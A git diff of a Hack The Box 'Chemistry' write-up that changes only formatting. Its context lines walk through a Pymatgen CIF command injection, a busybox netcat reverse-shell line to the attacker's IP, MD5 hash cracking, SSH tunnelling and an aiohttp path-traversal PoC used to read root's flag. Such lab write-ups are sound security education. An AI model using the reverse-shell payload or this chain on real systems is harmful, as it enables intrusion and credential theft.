@@ -1,6 +1,6 @@
 ![image](https://github.com/user-attachments/assets/81146324-46a2-4112-a69d-7cd2f5ea7918)
 
-<br><br>
+<br>
 
 **PLATFORM : Hack The Box**
 
@@ -16,7 +16,7 @@
 
 The inital nmap scans reveals two ports open, 22 and 5000.
 
-<br><br>
+<br>
 
 `$ nmap -sVC --version-intensity 9 -p 22,5000 -Pn --disable-arp-ping -n chemistry -oN nmap/versions-scan.txt`
 
@@ -48,7 +48,7 @@ The inital nmap scans reveals two ports open, 22 and 5000.
 
 The application hosted on the box at port 5000 looks like a parser for *Crystallographic Information Files (CIF)*.
 
-<br><br>
+<br>
 
 ![Pasted image 20241023002915-1](https://github.com/user-attachments/assets/b84120fa-fbe7-4534-844a-105686aa94f8)
 
@@ -62,7 +62,7 @@ A vulnerability in the parsing library *Pymatgen versions prior to 2024.2.8*, th
 
 All you need to do is craft a malicious .cif file, and then inject the command you want to execute in it. We have a template of the file's structure in the link above:
 
-<br><br>
+<br>
 
 > data_Example
 >
@@ -93,7 +93,7 @@ All you need to do is craft a malicious .cif file, and then inject the command y
 
 Experimenting with an active handler and a series of bash payloads from https://www.revshells.com/, i find the right one to be:
 
-<br><br>
+<br>
 
 > *busybox nc 10.10.15.56 1337 -e sh*
 
@@ -101,7 +101,7 @@ Experimenting with an active handler and a series of bash payloads from https://
 
 Which allows me to gain a reverse shell:
 
-<br><br>
+<br>
 
 ![Pasted image 20241023004209-1](https://github.com/user-attachments/assets/863f5c8e-9fd9-4335-832c-3b353981df40)
 
@@ -110,7 +110,7 @@ Which allows me to gain a reverse shell:
 
 Checking the app's directory, i'm able to retrieve the .db database that has stored all the *users passwords md5 hashes*, encoded with the following algorythm, as i can read in the *app.py* file.
 
-<br><br>
+<br>
 
 >    hashed_password = hashlib.md5(password.encode()).hexdigest()
 
@@ -118,15 +118,15 @@ Checking the app's directory, i'm able to retrieve the .db database that has sto
 
 ![Pasted image 20241023010333-1](https://github.com/user-attachments/assets/4d608551-6f3c-4efa-aa7f-12c6edfd4eac)
 
-<br><br>
+<br>
 
 ![Pasted image 20241023010740-1](https://github.com/user-attachments/assets/23efb1d7-f3bc-4c83-90d7-86ee6a9ee831)
 
-<br><br>
+<br>
 
 A quick hop to https://crackstation.net reveals me the cleartext password of rosa's user:
 
-<br><br>
+<br>
 
 ![Pasted image 20241102202421](https://github.com/user-attachments/assets/f75f982e-c7e4-4475-aaef-a51aa3d913ff)
 
@@ -134,7 +134,7 @@ A quick hop to https://crackstation.net reveals me the cleartext password of ros
 
 I get an initial foothold on the machine. I have credentials to access ssh:
 
-<br><br>
+<br>
 
 > *rosa:<ROSA'S_PASSWORD>*
 
@@ -142,7 +142,7 @@ I get an initial foothold on the machine. I have credentials to access ssh:
 
 Running linpeas.sh on the machine, i find out a *service listening on port 8080*, localhost
 
-<br><br>
+<br>
 
 ![Pasted image 20241023012150-2](https://github.com/user-attachments/assets/e23684f0-94c2-458f-bc70-886c0c5d34ca)
 
@@ -150,7 +150,7 @@ Running linpeas.sh on the machine, i find out a *service listening on port 8080*
 
 To enumerate this service, i make up an *SSH tunneling* to our remote host, using the following command:
 
-<br><br>
+<br>
 
 `ssh -L 8080:localhost:8080 rosa@10.10.11.38`
 
@@ -165,17 +165,17 @@ This forwards *my local* 8080 port  to the remote machine's local 8080 port.
 <br>
 
 It basically means that i can direct external traffic, like a scan or even access the service from a browser if possible, to an internal service on a remote machine that otherwise would be accessible only from the box itself.
-Nmap shows me that Chemistry is running *aiohttp 3.9.1*
+Nmap shows me that Chemistry is running *aiohttp 3.9.1*...
 
-<br><br>
+<br>
 
 ![Pasted image 20241102200205](https://github.com/user-attachments/assets/cf5b4ec4-b9b7-4c90-b592-e9532b9966f0)
 
 <br><br>
 
-and this is the first result if i search it on google:
+...and this is the first result if i search it on google:
 
-<br><br>
+<br>
 
 https://github.com/z3rObyte/CVE-2024-23334-PoC
 
@@ -183,7 +183,7 @@ https://github.com/z3rObyte/CVE-2024-23334-PoC
 
 It looks like aiohttp software it is vulnerable to *path traversal* up to version *3.9.1*. I'm going to modify a bit the script to make it run on *my* localhost's port 8080 and redirecting the exploit to the internal service, trying to read *root's flag*. 
 
-<br><br>
+<br>
 
 ![Pasted image 20241102200634](https://github.com/user-attachments/assets/ade0fe67-0d57-48da-a028-0c308f1ffe52)
 
@@ -191,7 +191,7 @@ It looks like aiohttp software it is vulnerable to *path traversal* up to versio
 
 And...
 
-<br><br>
+<br>
 
 ![Pasted image 20241102201153](https://github.com/user-attachments/assets/40bfecd8-d215-4b34-abe2-ae06e139e189)
 
